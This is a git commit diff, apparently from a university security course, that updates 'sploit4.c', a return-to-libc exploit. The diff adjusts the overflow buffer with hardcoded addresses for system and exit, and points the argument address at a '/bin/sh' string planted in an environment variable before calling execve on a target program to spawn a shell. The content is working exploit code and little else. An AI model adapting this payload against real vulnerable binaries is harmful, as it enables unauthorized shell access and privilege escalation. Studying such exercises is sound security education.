15160b63dbecf2020c7860a86dc7be2484a3ce97
Yordanos <yag3@cornell.edu>
2019-12-04 15:59:21 -0500

    working sploit4

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -18,20 +18,25 @@ int main(void)
 
   //change the address to the env
   printf("AA\n");
-  char rt_arr[16] = "";
+  char rt_arr[20] = "";
   strcat(rt_arr, "\xa0\x3d\xe4\xb7");
 
+  //ebp
+  strcat(rt_arr, "\xa0\x3d\xe4\xb7");
   //p system 0xb7 e4 3d a0 
   strcat(rt_arr, "\xa0\x3d\xe4\xb7");
   //p exit 0xb7 e3 79 d0
   strcat(rt_arr, "\xd0\x79\xe3\xb7");
   //argument add - 0xbf ff ff bd 
-  strcat(rt_arr, "\xbd\xff\xff\xbf");
-   
+  strcat(rt_arr, "\xb9\xff\xff\xbf");
+  //strcat(rt_arr, "/bin/sh");
+ 
+ 
   args[1] = rt_arr; 
   args[2] = NULL;
   
-  env[0] = "/bin/sh";
+  //env[0] = NULL;
+  env[0] = "YG=/bin/sh";
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
